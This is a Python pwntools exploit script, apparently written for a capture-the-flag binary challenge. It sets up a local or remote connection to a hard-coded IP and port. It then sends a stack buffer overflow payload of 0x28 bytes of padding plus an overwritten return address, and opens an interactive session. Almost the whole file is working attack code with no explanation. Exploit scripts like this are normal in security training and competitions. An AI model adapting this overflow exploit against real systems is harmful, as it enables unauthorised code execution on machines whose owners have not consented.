#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''

from pwn import *
import re
import argparse
import subprocess
from binascii import *


BINARY_FILE = './exp0'
REMOTE = ('159.89.21.200', 1337)


def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process(BINARY_FILE, stderr=open('/dev/null', 'w+'), env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = []
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    payload = 'A'*0x28
    payload += p64(0x401182)
    pause()

    s.sendline(payload)

    s.interactive()
    s.close()
